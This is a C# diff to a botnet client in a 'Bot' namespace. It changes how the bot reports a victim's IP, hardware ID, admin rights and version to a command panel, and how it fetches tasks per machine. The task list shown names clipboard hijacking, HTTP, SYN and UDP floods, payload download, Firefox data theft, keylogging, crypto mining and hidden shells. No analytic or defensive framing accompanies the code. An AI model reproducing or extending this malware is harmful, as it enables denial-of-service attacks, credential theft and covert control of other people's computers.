@@ -51,7 +51,6 @@ namespace Bot
         {
             do
             {
-
                     var uriBuilder = new UriBuilder("http://localhost/update.aspx");
                     var parameters = HttpUtility.ParseQueryString(string.Empty);
                     parameters["IP"] = Identification.getIP();
@@ -60,7 +59,6 @@ namespace Bot
                     parameters["HWID"] = Identification.getHWID();
                     parameters["Version"] = Settings.Botv;
                     parameters["admin"] = Identification.getAdmin().ToString();
-                    parameters["TaskAmount"] = CTask.Length.ToString();
                     uriBuilder.Port = 3951;
                     uriBuilder.Query = parameters.ToString();
                     Uri finalUrl = uriBuilder.Uri;
@@ -99,8 +97,8 @@ namespace Bot
             string[] Tasks = { "clipboard", "http","syn","udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
             do
             {
-                string[] NTask = new WebClient().DownloadString(Settings.panel + "/Task.aspx").ToString().Split(';');
-                Thread C = new Thread(new ThreadStart(Misc.clip));
+                string[] NTask = new WebClient().DownloadString(Settings.panel + "/Task.aspx?HWID=" + Identification.getHWID()).ToString().Split(';');
+                Thread C = new Thread(new ThreadStart(Misc.clip));  
                 foreach (string x in Tasks)
                 {
                     if (NTask.Contains(x))
